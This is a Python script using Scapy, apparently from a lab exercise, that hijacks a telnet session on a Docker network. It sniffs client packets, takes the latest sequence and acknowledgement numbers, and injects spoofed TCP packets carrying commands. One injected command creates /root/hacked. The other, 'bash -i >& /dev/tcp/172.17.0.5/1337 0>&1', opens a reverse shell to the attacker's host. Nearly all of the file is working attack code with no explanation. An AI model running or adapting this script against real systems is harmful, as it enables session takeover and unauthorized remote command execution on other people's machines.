from scapy.all import *

# Initialize variables to track the highest SEQ and ACK numbers
highest_seq = 0
highest_ack = 0
packet_to_modify = None  # Packet to modify based on highest SEQ/ACK numbers

def packet_callback(packet):
    """Callback function to process each packet and find the one with the highest SEQ and ACK."""
    global highest_seq, highest_ack, packet_to_modify
    if TCP in packet and packet[IP].src == "172.17.0.5" and packet[TCP].dport == 23:
        seq_num = packet['TCP'].seq
        ack_num = packet['TCP'].ack
        # Update if this packet has the highest SEQ or ACK seen so far
        if seq_num > highest_seq or ack_num > highest_ack:
            highest_seq = seq_num
            highest_ack = ack_num
            packet_to_modify = packet
            print("Updated to higher SEQ or ACK packet.")

def hardcoded():
    ip = IP(src="172.17.0.5", dst="172.17.0.4")
    tcp = TCP(sport=57014,dport=23,flags="A",seq=3659816861,ack=1819162829)
    data="\n mkdir /root/hacked \n"
    spoofed=ip/tcp/data
    send(spoofed,iface='docker0',verbose=0)


def edit_and_send_packet():
    """Function to edit and send the packet with the highest SEQ and ACK."""
    global packet_to_modify
    if packet_to_modify:
        seq_num = packet_to_modify['TCP'].seq
        ack_num = packet_to_modify['TCP'].ack
        print(f"Highest SEQ: {seq_num}, Highest ACK: {ack_num}, SRC IP: {packet_to_modify[IP].src}")

        # Prepare the spoofed packet
        ip = IP(src=packet_to_modify[IP].src, dst=packet_to_modify[IP].dst)
        tcp = TCP(sport=packet_to_modify[TCP].sport, dport=packet_to_modify[TCP].dport, flags="A",
                  seq=seq_num + len(packet_to_modify['TCP'].payload), ack=ack_num)
        data = "\n  bash -i >& /dev/tcp/172.17.0.5/1337 0>&1 \r\n"
        spoofed_pkt = ip/tcp/data
        send(spoofed_pkt, iface='docker0', verbose=0)

if __name__ == "__main__":
    sniff(iface='docker0', filter="tcp and src host 172.17.0.5 and dst port 23", prn=packet_callback, count=100)
    edit_and_send_packet()

